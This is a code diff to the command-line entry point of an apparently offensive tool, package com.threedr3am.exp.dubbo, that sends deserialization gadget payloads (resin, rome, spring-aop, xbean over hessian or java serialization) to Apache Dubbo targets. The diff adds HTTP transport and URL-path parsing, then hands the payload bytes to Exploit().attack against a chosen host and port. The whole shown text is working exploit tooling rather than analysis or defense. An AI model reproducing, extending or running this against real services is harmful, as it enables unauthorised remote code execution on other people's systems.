@@ -2,7 +2,11 @@ package com.threedr3am.exp.dubbo;
 
 import com.threedr3am.exp.dubbo.payload.Payload;
 import com.threedr3am.exp.dubbo.payload.Payloads;
+import com.threedr3am.exp.dubbo.protocol.Protocol;
+import com.threedr3am.exp.dubbo.protocol.Protocols;
+import com.threedr3am.exp.dubbo.serialization.Serialization;
 import com.threedr3am.exp.dubbo.serialization.Serializations;
+import java.util.Map;
 import org.apache.commons.cli.CommandLine;
 import org.apache.commons.cli.CommandLineParser;
 import org.apache.commons.cli.DefaultParser;
@@ -18,9 +22,9 @@ public class Main {
   public static void main(String[] args) throws ParseException {
     Options options = new Options()
         .addOption("h", false, "帮助信息")
-        .addOption("t", true, "目标，例：127.0.0.1:20880")
+        .addOption("t", true, "目标，例：-t 127.0.0.1:20880")
         .addOption("s", true, "[hessian|java] 序列化类型，默认缺省hessian")
-        .addOption("protocol", true, "[dubbo] 通讯协议名称，默认缺省dubbo")
+        .addOption("protocol", true, "[dubbo|http] 通讯协议名称，默认缺省dubbo")
         .addOption("p", true, "payload名称，hessian可选[resin|rome|spring-aop|xbean]，java可选[]")
         .addOption("param", true, "payload入参")
         .addOption("list", false, "输出所有payload信息")
@@ -77,17 +81,29 @@ public class Main {
       return;
     }
 
-    byte[] bytes = Serializations.getSerialization(s).makeData(payload, payloadArgs, protocol);
+    Serialization serialization = Serializations.getSerialization(s);
+    byte[] bytes = serialization.makeData(payload, payloadArgs, protocol);
 
     String target = cmd.hasOption("t") ? cmd.getOptionValue("t")
         : cmd.getOptionValue("target");
     String host = target;
     int port = 20880;
-    int index = target.indexOf(":");
+    String path = "/";
+    int index = target.indexOf("/");
+    if (index != -1) {
+      path = target.substring(index);
+      target = target.substring(0, index);
+    }
+    index = target.indexOf(":");
     if (index != -1) {
       host = target.substring(0, index);
       port = Integer.parseInt(target.substring(index + 1));
     }
+
+    Protocol protocolImpl = Protocols.getProtocol(protocol);
+    Map<String, String> extraData = protocolImpl.initExtraData(cmd);
+    bytes = protocolImpl.makeData(bytes, serialization, extraData);
+
     new Exploit().attack(host, port, bytes);
   }
 
